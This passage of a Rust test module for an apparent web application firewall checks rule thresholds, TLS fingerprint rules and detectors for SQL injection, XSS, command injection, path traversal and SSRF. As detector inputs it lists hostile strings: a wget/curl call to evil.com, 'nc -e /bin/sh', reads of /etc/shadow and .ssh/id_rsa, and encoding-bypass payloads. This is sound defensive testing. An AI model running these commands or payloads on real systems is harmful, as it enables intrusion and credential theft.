            (verdict.action, verdict.matched_rules)
        };

        // Score 30: above both thresholds → both 220010 (>=10) and 220011
        // (>=25) fire. Verdict must block because 220011 is blocking.
        let (action, hits) = run(30);
        assert_eq!(
            action,
            Action::Block,
            "schema score 30 must produce a block via rule 220011"
        );
        assert!(hits.contains(&220010), "220010 must fire at score 30");
        assert!(hits.contains(&220011), "220011 must fire at score 30");

        // Score 15: above 220010 (>=10) but below 220011 (>=25). Only
        // 220010 fires, and because 220010 is non-blocking the verdict
        // is Allow. This is the warning-level observability case.
        let (action, hits) = run(15);
        assert_eq!(
            action,
            Action::Allow,
            "schema score 15 must not block (220010 is non-blocking)"
        );
        assert!(
            hits.contains(&220010),
            "220010 must fire at score 15 (warning level)"
        );
        assert!(
            !hits.contains(&220011),
            "220011 must NOT fire at score 15 (below block threshold)"
        );

        // Score 5: below both thresholds, neither rule fires.
        let (action, hits) = run(5);
        assert_eq!(action, Action::Allow);
        assert!(!hits.contains(&220010));
        assert!(!hits.contains(&220011));

        // No schema_result attached at all: neither rule fires regardless
        // of method/path. This is the negative baseline.
        let req = Request {
            method: "POST",
            path: "/api/items",
            client_ip: "1.2.3.4",
            ..Default::default()
        };
        let verdict = engine.analyze(&req);
        assert!(!verdict.matched_rules.contains(&220010));
        assert!(!verdict.matched_rules.contains(&220011));
    }

    #[test]
    fn test_signal_correlation_ja4_rules_fire_on_deprecated_tls() {
        let engine = load_production_rules_engine();

        // Build a ClientFingerprint with a specific JA4 raw prefix. The
        // JA4 match kind does a substring check, so only the first few
        // characters matter — the rest of the raw string just needs to
        // parse-trip without actually being a real JA4.
        fn fingerprint_with_ja4_prefix(prefix: &str) -> ClientFingerprint {
            ClientFingerprint {
                ja4: Some(Ja4Fingerprint {
                    raw: format!("{}d1516h2_000000000000_000000000000", prefix),
                    protocol: Ja4Protocol::TCP,
                    tls_version: 10,
                    sni_type: Ja4SniType::Domain,
                    cipher_count: 15,
                    ext_count: 16,
                    alpn: "h2".to_string(),
                    cipher_hash: "000000000000".to_string(),
                    ext_hash: "000000000000".to_string(),
                }),
                ja4h: Ja4hFingerprint {
                    raw: "ge11cnrn_000000000000_000000000000".to_string(),
                    method: "ge".to_string(),
                    http_version: 11,
                    has_cookie: true,
                    has_referer: true,
                    accept_lang: "en".to_string(),
                    header_hash: "000000000000".to_string(),
                    cookie_hash: "000000000000".to_string(),
                },
                combined_hash: "0000000000000000".to_string(),
            }
        }

        let run = |prefix: &str| -> Vec<u32> {
            let fp = fingerprint_with_ja4_prefix(prefix);
            let req = Request {
                method: "GET",
                path: "/",
                client_ip: "1.2.3.4",
                fingerprint: Some(&fp),
                ..Default::default()
            };
            engine.analyze(&req).matched_rules
        };

        // Rule 220020: TLS 1.0 (JA4 prefix "t10").
        let hits = run("t10");
        assert!(
            hits.contains(&220020),
            "220020 (TLS 1.0) must fire on 't10' JA4 prefix, got {:?}",
            hits
        );
        assert!(
            !hits.contains(&220021),
            "220021 (TLS 1.1) must NOT fire on t10"
        );

        // Rule 220021: TLS 1.1 (JA4 prefix "t11").
        let hits = run("t11");
        assert!(
            hits.contains(&220021),
            "220021 (TLS 1.1) must fire on 't11' JA4 prefix, got {:?}",
            hits
        );
        assert!(
            !hits.contains(&220020),
            "220020 (TLS 1.0) must NOT fire on t11"
        );

        // Negative baseline: modern TLS 1.3 client. Neither deprecated-TLS
        // rule fires. This is the important false-positive guard: if
        // 220020/220021 were over-broad, legitimate modern clients would
        // accumulate risk score for no reason.
        let hits = run("t13");
        assert!(
            !hits.contains(&220020),
            "220020 must NOT fire on modern TLS 1.3 client"
        );
        assert!(
            !hits.contains(&220021),
            "220021 must NOT fire on modern TLS 1.3 client"
        );

        // Negative baseline: no fingerprint attached at all (e.g. plain
        // HTTP traffic or JA4 disabled). Neither rule can fire because
        // eval_ja4 returns false on a None fingerprint.
        let req = Request {
            method: "GET",
            path: "/",
            client_ip: "1.2.3.4",
            ..Default::default()
        };
        let verdict = engine.analyze(&req);
        assert!(!verdict.matched_rules.contains(&220020));
        assert!(!verdict.matched_rules.contains(&220021));
    }

    #[test]
    fn test_deferred_not_dlp_violation_fires_on_zero_matches() {
        // TASK-35 correctness guarantee: a rule that wraps dlp_violation in
        // a NOT operator must be evaluated by the deferred pass even when
        // the DLP scanner produced zero matches. The engine itself has
        // always handled this correctly — eval_dlp_violation returns false
        // on empty matches and `not` inverts it to true — but the
        // upstream_request_filter gate previously short-circuited on empty
        // matches so the engine was never invoked. This test pins the
        // engine-side contract so main.rs's gate fix has something to rely
        // on.
        let mut engine = Engine::empty();
        let rules = r#"[{
            "id": 9010,
            "description": "Block sensitive-path POSTs that skipped DLP entirely",
            "risk": 30.0,
            "blocking": true,
            "matches": [
                {"type": "method", "match": "POST"},
                {
                    "type": "boolean",
                    "op": "not",
                    "match": {"type": "dlp_violation"}
                }
            ]
        }]"#;
        engine.load_rules(rules.as_bytes()).unwrap();

        // The NOT-wrapped dlp_violation still tags the rule as deferred —
        // the walker recurses through boolean operands.
        assert_eq!(engine.deferred_rule_indices.len(), 1);
        assert!(engine.deferred_rule_id_set.contains(&9010));

        // Deferred pass with zero DLP matches: the NOT path makes
        // dlp_violation evaluate to true, and the method=POST path matches
        // the request, so the rule fires and blocks.
        let req = Request {
            method: "POST",
            path: "/api/sensitive",
            client_ip: "1.2.3.4",
            dlp_matches: Some(&[]),
            ..Default::default()
        };
        let verdict = engine.analyze_deferred_with_timeout(&req, DEFAULT_EVAL_TIMEOUT);
        assert_eq!(verdict.action, Action::Block);
        assert!(verdict.matched_rules.contains(&9010));

        // Body-phase `analyze` still skips deferred rules entirely — the
        // NOT-wrapped rule is deferred like any other dlp_violation rule.
        let body_verdict = engine.analyze(&req);
        assert_eq!(body_verdict.action, Action::Allow);
        assert!(!body_verdict.matched_rules.contains(&9010));

        // And when DLP did find matches, the NOT path now evaluates to
        // false, so the rule correctly does NOT fire in the deferred pass.
        let matches = vec![dlp_match(SensitiveDataType::Ssn)];
        let req_with_matches = Request {
            method: "POST",
            path: "/api/sensitive",
            client_ip: "1.2.3.4",
            dlp_matches: Some(&matches),
            ..Default::default()
        };
        let verdict_with_matches =
            engine.analyze_deferred_with_timeout(&req_with_matches, DEFAULT_EVAL_TIMEOUT);
        assert_eq!(verdict_with_matches.action, Action::Allow);
        assert!(!verdict_with_matches.matched_rules.contains(&9010));
    }

    #[test]
    fn test_dlp_violation_compare_threshold_op_variants() {
        // TASK-39 coverage: compare_threshold supports gte / gt / eq / neq /
        // lte / lt and defaults to gte when op is absent. Existing tests
        // only exercised the default gte path, so silent regressions in any
        // other op would go unnoticed. This test loads one rule per op
        // (plus an unknown-op rule that must always return false) against
        // the same numeric threshold (3), then varies the actual match
        // count across below / equal / above the threshold and asserts the
        // expected fire / no-fire outcome for every cell in the 7×3 table.
        //
        // dlp_violation is a deferred match kind, so the test uses
        // analyze_deferred_with_timeout rather than analyze().
        let mut engine = Engine::empty();
        let rules = r#"[
            {"id": 101, "description": "gte",
             "risk": 10.0, "blocking": true,
             "matches": [{"type": "dlp_violation", "op": "gte", "match": 3}]},
            {"id": 102, "description": "gt",
             "risk": 10.0, "blocking": true,
             "matches": [{"type": "dlp_violation", "op": "gt", "match": 3}]},
            {"id": 103, "description": "eq",
             "risk": 10.0, "blocking": true,
             "matches": [{"type": "dlp_violation", "op": "eq", "match": 3}]},
            {"id": 104, "description": "neq",
             "risk": 10.0, "blocking": true,
             "matches": [{"type": "dlp_violation", "op": "neq", "match": 3}]},
            {"id": 105, "description": "lte",
             "risk": 10.0, "blocking": true,
             "matches": [{"type": "dlp_violation", "op": "lte", "match": 3}]},
            {"id": 106, "description": "lt",
             "risk": 10.0, "blocking": true,
             "matches": [{"type": "dlp_violation", "op": "lt", "match": 3}]},
            {"id": 107, "description": "unknown op must never fire",
             "risk": 10.0, "blocking": true,
             "matches": [{"type": "dlp_violation", "op": "approximately", "match": 3}]}
        ]"#;
        engine.load_rules(rules.as_bytes()).unwrap();

        // Run the deferred pass with `count` DLP matches and return the
        // matched_rules set. We build fresh Vec<DlpMatch> each call so the
        // borrow on `matches` lives long enough for `dlp_matches: Some(&m)`.
        let run = |count: usize| -> Vec<u32> {
            let m: Vec<DlpMatch> = (0..count).map(|_| dlp_match(SensitiveDataType::Ssn)).collect();
            let req = Request {
                method: "POST",
                path: "/",
                client_ip: "1.2.3.4",
                dlp_matches: Some(&m),
                ..Default::default()
            };
            engine
                .analyze_deferred_with_timeout(&req, DEFAULT_EVAL_TIMEOUT)
                .matched_rules
        };

        let below = run(2); // count < 3
        let equal = run(3); // count == 3
        let above = run(4); // count > 3

        // gte (id 101): fires when count >= 3
        assert!(!below.contains(&101), "gte: 2 >= 3 must be false");
        assert!(equal.contains(&101), "gte: 3 >= 3 must be true");
        assert!(above.contains(&101), "gte: 4 >= 3 must be true");

        // gt (id 102): fires when count > 3
        assert!(!below.contains(&102), "gt: 2 > 3 must be false");
        assert!(!equal.contains(&102), "gt: 3 > 3 must be false");
        assert!(above.contains(&102), "gt: 4 > 3 must be true");

        // eq (id 103): fires when count == 3
        assert!(!below.contains(&103), "eq: 2 == 3 must be false");
        assert!(equal.contains(&103), "eq: 3 == 3 must be true");
        assert!(!above.contains(&103), "eq: 4 == 3 must be false");

        // neq (id 104): fires when count != 3
        assert!(below.contains(&104), "neq: 2 != 3 must be true");
        assert!(!equal.contains(&104), "neq: 3 != 3 must be false");
        assert!(above.contains(&104), "neq: 4 != 3 must be true");

        // lte (id 105): fires when count <= 3
        assert!(below.contains(&105), "lte: 2 <= 3 must be true");
        assert!(equal.contains(&105), "lte: 3 <= 3 must be true");
        assert!(!above.contains(&105), "lte: 4 <= 3 must be false");

        // lt (id 106): fires when count < 3
        assert!(below.contains(&106), "lt: 2 < 3 must be true");
        assert!(!equal.contains(&106), "lt: 3 < 3 must be false");
        assert!(!above.contains(&106), "lt: 4 < 3 must be false");

        // Unknown op (id 107): compare_threshold returns false for any
        // op it doesn't recognize, so the rule must never fire regardless
        // of the actual count. This is the AC#3 negative case.
        assert!(!below.contains(&107), "unknown op must never fire");
        assert!(!equal.contains(&107), "unknown op must never fire");
        assert!(!above.contains(&107), "unknown op must never fire");
    }

    #[test]
    fn test_schema_violation_compare_threshold_op_variants() {
        // Mirror of test_dlp_violation_compare_threshold_op_variants for the
        // schema_violation match kind. schema_violation is NOT deferred, so
        // rules are evaluated via the normal analyze() path. The threshold
        // (20) and the three test scores (15, 20, 25) are arbitrary — only
        // the below/equal/above relationship matters.
        let mut engine = Engine::empty();
        let rules = r#"[
            {"id": 201, "description": "gte",
             "risk": 10.0, "blocking": true,
             "matches": [{"type": "schema_violation", "op": "gte", "match": 20}]},
            {"id": 202, "description": "gt",
             "risk": 10.0, "blocking": true,
             "matches": [{"type": "schema_violation", "op": "gt", "match": 20}]},
            {"id": 203, "description": "eq",
             "risk": 10.0, "blocking": true,
             "matches": [{"type": "schema_violation", "op": "eq", "match": 20}]},
            {"id": 204, "description": "neq",
             "risk": 10.0, "blocking": true,
             "matches": [{"type": "schema_violation", "op": "neq", "match": 20}]},
            {"id": 205, "description": "lte",
             "risk": 10.0, "blocking": true,
             "matches": [{"type": "schema_violation", "op": "lte", "match": 20}]},
            {"id": 206, "description": "lt",
             "risk": 10.0, "blocking": true,
             "matches": [{"type": "schema_violation", "op": "lt", "match": 20}]},
            {"id": 207, "description": "unknown op must never fire",
             "risk": 10.0, "blocking": true,
             "matches": [{"type": "schema_violation", "op": "approximately", "match": 20}]}
        ]"#;
        engine.load_rules(rules.as_bytes()).unwrap();

        // Run body-phase analyze with a ValidationResult of the given score
        // and return the matched_rules set. The sample violation exists only
        // so is_valid() returns false; its own severity is overridden by the
        // explicit total_score in the struct literal.
        let sample_violation = SchemaViolation::unexpected_field("/foo");
        let run = |score: u32| -> Vec<u32> {
            let result = ValidationResult {
                violations: vec![sample_violation.clone()],
                total_score: score,
            };
            let req = Request {
                method: "POST",
                path: "/",
                client_ip: "1.2.3.4",
                schema_result: Some(&result),
                ..Default::default()
            };
            engine.analyze(&req).matched_rules
        };

        let below = run(15); // score < 20
        let equal = run(20); // score == 20
        let above = run(25); // score > 20

        // gte (id 201): fires when score >= 20
        assert!(!below.contains(&201), "gte: 15 >= 20 must be false");
        assert!(equal.contains(&201), "gte: 20 >= 20 must be true");
        assert!(above.contains(&201), "gte: 25 >= 20 must be true");

        // gt (id 202): fires when score > 20
        assert!(!below.contains(&202), "gt: 15 > 20 must be false");
        assert!(!equal.contains(&202), "gt: 20 > 20 must be false");
        assert!(above.contains(&202), "gt: 25 > 20 must be true");

        // eq (id 203): fires when score == 20
        assert!(!below.contains(&203), "eq: 15 == 20 must be false");
        assert!(equal.contains(&203), "eq: 20 == 20 must be true");
        assert!(!above.contains(&203), "eq: 25 == 20 must be false");

        // neq (id 204): fires when score != 20
        assert!(below.contains(&204), "neq: 15 != 20 must be true");
        assert!(!equal.contains(&204), "neq: 20 != 20 must be false");
        assert!(above.contains(&204), "neq: 25 != 20 must be true");

        // lte (id 205): fires when score <= 20
        assert!(below.contains(&205), "lte: 15 <= 20 must be true");
        assert!(equal.contains(&205), "lte: 20 <= 20 must be true");
        assert!(!above.contains(&205), "lte: 25 <= 20 must be false");

        // lt (id 206): fires when score < 20
        assert!(below.contains(&206), "lt: 15 < 20 must be true");
        assert!(!equal.contains(&206), "lt: 20 < 20 must be false");
        assert!(!above.contains(&206), "lt: 25 < 20 must be false");

        // Unknown op (id 207): never fires. AC#3 negative case.
        assert!(!below.contains(&207), "unknown op must never fire");
        assert!(!equal.contains(&207), "unknown op must never fire");
        assert!(!above.contains(&207), "unknown op must never fire");
    }

    #[test]
    fn test_condition_is_deferred_walks_nested_boolean_operators() {
        // TASK-38 coverage: condition_is_deferred recursively inspects
        // match_value sub-conditions and boolean operand arrays. Before
        // this test, only a leaf-level dlp_violation was exercised by
        // test_dlp_violation_is_deferred_not_body_phase — nested patterns
        // were unverified, so a future refactor of the walker could
        // silently break rule tagging.
        //
        // This test loads four rules in a single batch and inspects
        // engine.deferred_rule_id_set directly. Three positive cases
        // wrap dlp_violation in and/or/not; one negative case uses only
        // non-deferred match kinds inside a boolean wrapper.
        let mut engine = Engine::empty();
        let rules = r#"[
            {
                "id": 9020,
                "description": "dlp_violation under and wrapper",
                "risk": 10.0,
                "blocking": true,
                "matches": [
                    {
                        "type": "boolean",
                        "op": "and",
                        "match": [
                            {"type": "method", "match": "POST"},
                            {"type": "dlp_violation", "match": 1}
                        ]
                    }
                ]
            },
            {
                "id": 9021,
                "description": "dlp_violation under or wrapper",
                "risk": 10.0,
                "blocking": true,
                "matches": [
                    {
                        "type": "boolean",
                        "op": "or",
                        "match": [
                            {"type": "dlp_violation", "match": 5},
                            {"type": "uri", "match": {"type": "contains", "match": "/secret"}}
                        ]
                    }
                ]
            },
            {
                "id": 9022,
                "description": "dlp_violation under not wrapper",
                "risk": 10.0,
                "blocking": true,
                "matches": [
                    {
                        "type": "boolean",
                        "op": "not",
                        "match": {"type": "dlp_violation"}
                    }
                ]
            },
            {
                "id": 9023,
                "description": "Non-deferred rule with boolean wrapper — negative case",
                "risk": 10.0,
                "blocking": true,
                "matches": [
                    {
                        "type": "boolean",
                        "op": "and",
                        "match": [
                            {"type": "uri", "match": {"type": "contains", "match": "/admin"}},
                            {"type": "method", "match": "DELETE"}
                        ]
                    }
                ]
            }
        ]"#;
        engine.load_rules(rules.as_bytes()).unwrap();

        // The three dlp_violation-referencing rules must be tagged deferred
        // regardless of whether the reference is at the leaf, inside an
        // `and` array, inside an `or` array, or wrapped in a `not`.
        assert!(
            engine.deferred_rule_id_set.contains(&9020),
            "dlp_violation under `and` must be tagged deferred"
        );
        assert!(
            engine.deferred_rule_id_set.contains(&9021),
            "dlp_violation under `or` must be tagged deferred"
        );
        assert!(
            engine.deferred_rule_id_set.contains(&9022),
            "dlp_violation under `not` must be tagged deferred"
        );

        // The pure uri+method rule must NOT be tagged — this is the
        // negative assertion that guards against over-tagging. If the
        // walker accidentally flagged rules containing boolean wrappers
        // as deferred, this assertion catches it.
        assert!(
            !engine.deferred_rule_id_set.contains(&9023),
            "non-deferred boolean-wrapped rule must NOT be tagged deferred"
        );

        // Exactly three of the four rules should be in the deferred set.
        assert_eq!(
            engine.deferred_rule_indices.len(),
            3,
            "expected exactly 3 deferred rules (ids 9020, 9021, 9022)"
        );
    }

    #[test]
    fn test_load_rules() {
        let mut engine = Engine::empty();
        let rules = r#"[
            {
                "id": 1,
                "description": "SQL injection",
                "risk": 10.0,
                "blocking": true,
                "matches": [
                    {"type": "uri", "match": {"type": "contains", "match": "' OR '"}}
                ]
            }
        ]"#;
        let count = engine.load_rules(rules.as_bytes()).unwrap();
        assert_eq!(count, 1);
    }

    #[test]
    fn test_analyze_sqli() {
        let mut engine = Engine::empty();
        let rules = r#"[
            {
                "id": 1,
                "description": "SQL injection",
                "risk": 10.0,
                "blocking": true,
                "matches": [
                    {"type": "uri", "match": {"type": "contains", "match": "' OR '"}}
                ]
            }
        ]"#;
        engine.load_rules(rules.as_bytes()).unwrap();

        let verdict = engine.analyze(&Request {
            method: "GET",
            path: "/api/users?id=1' OR '1'='1",
            ..Default::default()
        });

        assert_eq!(verdict.action, Action::Block);
        assert!(verdict.risk_score > 0);
        assert!(verdict.matched_rules.contains(&1));
    }

    #[test]
    fn test_sql_analyzer() {
        // SQL phrases detection
        assert!(sql_analyzer_score("SELECT * FROM users") > 0);
        assert!(sql_analyzer_score("SELECT * FROM information_schema") > 0);
        assert!(sql_analyzer_score("INSERT INTO users") > 0);
        assert!(sql_analyzer_score("DELETE FROM users") > 0);
        assert!(sql_analyzer_score("UNION SELECT * FROM users") > 0);
        // SQL comment injection
        assert!(sql_analyzer_score("admin' --") > 0);
        // Normal text should not match
        assert!(sql_analyzer_score("hello world") == 0);
        assert!(sql_analyzer_score("normal query string") == 0);
    }

    #[test]
    fn test_xss_analyzer() {
        assert!(xss_analyzer_score("<script>alert(1)</script>") > 0);
        assert!(xss_analyzer_score("javascript:alert(1)") > 0);
        assert!(xss_analyzer_score("onclick=alert(1)") > 0);
        assert!(xss_analyzer_score("hello world") == 0);
    }

    /// SECURITY TEST: Verify XSS detection cannot be bypassed via HTML entity encoding.
    #[test]
    fn test_xss_analyzer_html_entity_bypass() {
        // Decimal entity encoding bypass attempts
        assert!(
            xss_analyzer_score("&#60;script&#62;alert(1)&#60;/script&#62;") > 0,
            "Should detect <script> via decimal entities"
        );

        // Hex entity encoding bypass attempts
        assert!(
            xss_analyzer_score("&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;") > 0,
            "Should detect <script> via hex entities"
        );

        // Named entity encoding bypass attempts
        assert!(
            xss_analyzer_score("&lt;script&gt;alert(1)&lt;/script&gt;") > 0,
            "Should detect <script> via named entities"
        );

        // Mixed encoding
        assert!(
            xss_analyzer_score("&#60;script&gt;alert(1)&#x3C;/script>") > 0,
            "Should detect <script> via mixed entities"
        );

        // javascript: scheme with entity encoding
        assert!(
            xss_analyzer_score(
                "&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)"
            ) > 0,
            "Should detect javascript: via decimal entities"
        );

        // onerror with entity encoding
        assert!(
            xss_analyzer_score("&#111;&#110;&#101;&#114;&#114;&#111;&#114;=alert(1)") > 0,
            "Should detect onerror via decimal entities"
        );

        // document.cookie with entities
        assert!(
            xss_analyzer_score("&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#111;&#111;&#107;&#105;&#101;") > 0,
            "Should detect document.cookie via decimal entities"
        );

        // Uppercase hex entities
        assert!(
            xss_analyzer_score("&#X3C;script&#X3E;") > 0,
            "Should detect script tag with uppercase hex"
        );

        // img tag with entity encoding
        assert!(
            xss_analyzer_score("&#60;img src=x onerror=alert(1)&#62;") > 0,
            "Should detect img tag via entities"
        );
    }

    /// Test HTML entity decoder directly.
    #[test]
    fn test_decode_html_entities() {
        // Decimal entities
        assert_eq!(decode_html_entities("&#60;"), "<");
        assert_eq!(decode_html_entities("&#62;"), ">");
        assert_eq!(decode_html_entities("&#60;script&#62;"), "<script>");

        // Hex entities
        assert_eq!(decode_html_entities("&#x3C;"), "<");
        assert_eq!(decode_html_entities("&#x3E;"), ">");
        assert_eq!(decode_html_entities("&#X3C;script&#X3E;"), "<script>");

        // Named entities
        assert_eq!(decode_html_entities("&lt;"), "<");
        assert_eq!(decode_html_entities("&gt;"), ">");
        assert_eq!(decode_html_entities("&amp;"), "&");
        assert_eq!(decode_html_entities("&quot;"), "\"");
        assert_eq!(decode_html_entities("&apos;"), "'");

        // Mixed content
        assert_eq!(decode_html_entities("hello &lt;world&gt;"), "hello <world>");

        // No entities
        assert_eq!(decode_html_entities("no entities here"), "no entities here");

        // Invalid entities pass through
        assert_eq!(decode_html_entities("&unknown;"), "&unknown;");
        assert_eq!(decode_html_entities("&;"), "&;");

        // Incomplete entities
        assert_eq!(decode_html_entities("&lt"), "&lt");
    }

    /// Test double-decoding detection for nested encoding attacks.
    #[test]
    fn test_xss_double_encoding_bypass() {
        // Double-encoded <script> tag: first decode gives &#60;, second gives <
        // &amp;#60; -> &#60; -> <
        assert!(
            xss_analyzer_score("&amp;#60;script&amp;#62;") > 0,
            "Should detect double-encoded script tag"
        );
    }

    /// Test command injection detection.
    #[test]
    fn test_cmd_analyzer() {
        // Backtick command execution
        assert!(
            cmd_analyzer_score(r"`cat /etc/passwd`") > 0,
            "Should detect backtick execution"
        );
        assert!(
            cmd_analyzer_score(r"`id`") > 0,
            "Should detect simple backtick"
        );

        // $() command substitution
        assert!(
            cmd_analyzer_score(r"$(cat /etc/passwd)") > 0,
            "Should detect subshell execution"
        );
        assert!(
            cmd_analyzer_score(r"$(whoami)") > 0,
            "Should detect simple subshell"
        );

        // Variable substitution
        assert!(
            cmd_analyzer_score(r"${PATH}") > 0,
            "Should detect variable substitution"
        );
        assert!(
            cmd_analyzer_score(r"${IFS}") > 0,
            "Should detect IFS substitution"
        );

        // IFS manipulation
        assert!(cmd_analyzer_score(r"$IFS") > 0, "Should detect $IFS");
        assert!(
            cmd_analyzer_score(r"IFS=x") > 0,
            "Should detect IFS assignment"
        );

        // Dangerous commands
        assert!(
            cmd_analyzer_score(r"cat /etc/passwd") > 0,
            "Should detect /etc/passwd access"
        );
        assert!(
            cmd_analyzer_score(r"cat /etc/shadow") > 0,
            "Should detect /etc/shadow access"
        );
        assert!(
            cmd_analyzer_score(r"wget http://evil.com/shell.sh") > 0,
            "Should detect wget"
        );
        assert!(
            cmd_analyzer_score(r"curl http://evil.com") > 0,
            "Should detect curl"
        );
        assert!(
            cmd_analyzer_score(r"nc -e /bin/sh") > 0,
            "Should detect netcat"
        );
        assert!(cmd_analyzer_score(r"bash -i") > 0, "Should detect bash -i");
        assert!(
            cmd_analyzer_score(r"/bin/sh -c 'cmd'") > 0,
            "Should detect /bin/sh -c"
        );

        // Clean values should not match
        assert!(
            cmd_analyzer_score("hello world") == 0,
            "Clean value should not match"
        );
        assert!(
            cmd_analyzer_score("user@example.com") == 0,
            "Email should not match"
        );
    }

    /// SECURITY TEST: Verify command injection detection via newline encoding.
    #[test]
    fn test_cmd_analyzer_newline_bypass() {
        // URL-encoded newlines
        assert!(
            cmd_analyzer_score("id%0acat /etc/passwd") > 0,
            "Should detect %0a newline injection"
        );
        assert!(
            cmd_analyzer_score("cmd%0dmore") > 0,
            "Should detect %0d carriage return injection"
        );
        assert!(
            cmd_analyzer_score("%0A%0D") > 0,
            "Should detect uppercase encoded CRLF"
        );

        // Double-encoded newlines
        assert!(
            cmd_analyzer_score("id%250acat") > 0,
            "Should detect double-encoded newline"
        );
    }

    /// SECURITY TEST: Verify command injection detection via IFS and variable substitution.
    #[test]
    fn test_cmd_analyzer_ifs_bypass() {
        // IFS bypass techniques
        assert!(
            cmd_analyzer_score(r"cat${IFS}/etc/passwd") > 0,
            "Should detect $IFS brace bypass"
        );
        assert!(
            cmd_analyzer_score(r"cat$IFS/etc/passwd") > 0,
            "Should detect $IFS bypass"
        );
        assert!(
            cmd_analyzer_score(r"{cat,/etc/passwd}") > 0,
            "Should detect brace expansion"
        );
    }

    /// SECURITY TEST: Verify null byte injection detection.
    #[test]
    fn test_cmd_analyzer_null_byte() {
        assert!(
            cmd_analyzer_score("file.txt%00.jpg") > 0,
            "Should detect %00 null byte"
        );
        assert!(
            cmd_analyzer_score("cmd\\x00param") > 0,
            "Should detect \\x00 null byte"
        );
    }

    /// Test basic path traversal detection.
    #[test]
    fn test_path_traversal_analyzer_basic() {
        // Basic path traversal
        assert!(
            path_traversal_analyzer_score("../etc/passwd") > 0,
            "Should detect basic ../"
        );
        assert!(
            path_traversal_analyzer_score("..\\Windows\\System32") > 0,
            "Should detect basic ..\\"
        );
        assert!(
            path_traversal_analyzer_score("....//etc/passwd") > 0,
            "Should detect multiple dots"
        );

        // Clean paths should not match
        assert!(
            path_traversal_analyzer_score("/home/user/file.txt") == 0,
            "Clean path should not match"
        );
        assert!(
            path_traversal_analyzer_score("relative/path/to/file") == 0,
            "Relative path without traversal should not match"
        );
    }

    /// SECURITY TEST: Verify path traversal detection via URL encoding bypass.
    #[test]
    fn test_path_traversal_url_encoding_bypass() {
        // Single URL-encoded
        assert!(
            path_traversal_analyzer_score("%2e%2e%2fetc/passwd") > 0,
            "Should detect %2e%2e%2f (URL-encoded ../)"
        );
        assert!(
            path_traversal_analyzer_score("..%2fetc/passwd") > 0,
            "Should detect ..%2f (partial encoding)"
        );
        assert!(
            path_traversal_analyzer_score("%2e%2e/etc/passwd") > 0,
            "Should detect %2e%2e/ (partial encoding)"
        );

        // Uppercase encoding
        assert!(
            path_traversal_analyzer_score("%2E%2E%2Fetc/passwd") > 0,
            "Should detect uppercase %2E%2E%2F"
        );
    }

    /// SECURITY TEST: Verify path traversal detection via double URL encoding bypass.
    #[test]
    fn test_path_traversal_double_encoding_bypass() {
        // Double URL-encoded: %252e = %2e after first decode = . after second
        assert!(
            path_traversal_analyzer_score("%252e%252e%252fetc/passwd") > 0,
            "Should detect double-encoded %252e%252e%252f"
        );
        assert!(
            path_traversal_analyzer_score("%252E%252E%252F") > 0,
            "Should detect uppercase double-encoded"
        );

        // Triple encoding (extreme case)
        assert!(
            path_traversal_analyzer_score("%25252e%25252e%25252f") > 0,
            "Should detect triple-encoded path traversal"
        );
    }

    /// SECURITY TEST: Verify path traversal detection via Unicode/overlong UTF-8 bypass.
    #[test]
    fn test_path_traversal_unicode_bypass() {
        // Overlong UTF-8 encoding of '.'
        assert!(
            path_traversal_analyzer_score("%c0%ae%c0%ae/etc/passwd") > 0,
            "Should detect overlong UTF-8 %c0%ae (dot)"
        );
        // Overlong UTF-8 encoding of '/'
        assert!(
            path_traversal_analyzer_score("..%c0%afetc/passwd") > 0,
            "Should detect overlong UTF-8 %c0%af (slash)"
        );
        // Mixed
        assert!(
            path_traversal_analyzer_score("%c0%ae%c0%ae%c0%afetc%c0%afpasswd") > 0,
            "Should detect mixed overlong encoding"
        );
    }

    /// SECURITY TEST: Verify path traversal detection for Windows-specific patterns.
    #[test]
    fn test_path_traversal_windows_patterns() {
        // Backslash variants
        assert!(
            path_traversal_analyzer_score("..\\..\\boot.ini") > 0,
            "Should detect Windows backslash traversal"
        );
        assert!(
            path_traversal_analyzer_score("%2e%2e%5c") > 0,
            "Should detect %5c (encoded backslash)"
        );

        // Windows sensitive files
        assert!(
            path_traversal_analyzer_score("..\\..\\Windows\\System32\\config\\SAM") > 0,
            "Should detect SAM file access"
        );
        assert!(
            path_traversal_analyzer_score("..\\..\\boot.ini") > 0,
            "Should detect boot.ini access"
        );
    }

    /// SECURITY TEST: Verify path traversal detection for sensitive Unix files.
    #[test]
    fn test_path_traversal_unix_sensitive_targets() {
        // Unix sensitive files with traversal context
        assert!(
            path_traversal_analyzer_score("../../etc/passwd") > 0,
            "Should detect /etc/passwd access"
        );
        assert!(
            path_traversal_analyzer_score("..%2f..%2fetc%2fshadow") > 0,
            "Should detect encoded /etc/shadow access"
        );
        assert!(
            path_traversal_analyzer_score("../../.ssh/id_rsa") > 0,
            "Should detect .ssh access"
        );
        assert!(
            path_traversal_analyzer_score("../../proc/self/environ") > 0,
            "Should detect /proc access"
        );
    }

    /// SECURITY TEST: Verify null byte truncation detection.
    #[test]
    fn test_path_traversal_null_byte() {
        assert!(
            path_traversal_analyzer_score("../etc/passwd%00.jpg") > 0,
            "Should detect null byte truncation"
        );
        assert!(
            path_traversal_analyzer_score("file.txt\\x00../etc/passwd") > 0,
            "Should detect \\x00 null byte"
        );
    }

    /// Test the normalize_unicode_path helper function.
    #[test]
    fn test_normalize_unicode_path() {
        // Dot normalization
        assert_eq!(normalize_unicode_path("%c0%ae"), ".");
        assert_eq!(normalize_unicode_path("%C0%AE"), ".");
        assert_eq!(normalize_unicode_path("%e0%80%ae"), ".");

        // Slash normalization
        assert_eq!(normalize_unicode_path("%c0%af"), "/");
        assert_eq!(normalize_unicode_path("%C0%AF"), "/");

        // Backslash normalization
        assert_eq!(normalize_unicode_path("%c1%9c"), "\\");
        assert_eq!(normalize_unicode_path("%C1%9C"), "\\");

        // Combined
        assert_eq!(normalize_unicode_path("%c0%ae%c0%ae%c0%af"), "../");
    }

    // ==================== SSRF Detection Tests ====================

    /// Test SSRF detection for localhost addresses.
    #[test]
    fn test_ssrf_analyzer_localhost() {
        // IPv4 localhost
        assert!(
            ssrf_analyzer_score("http://127.0.0.1/") > 0,
            "Should detect 127.0.0.1"
        );
        assert!(
            ssrf_analyzer_score("http://127.0.0.2/admin") > 0,
            "Should detect 127.0.0.x"
        );
        assert!(
            ssrf_analyzer_score("https://127.255.255.255:8080/") > 0,
            "Should detect 127.x.x.x"
        );

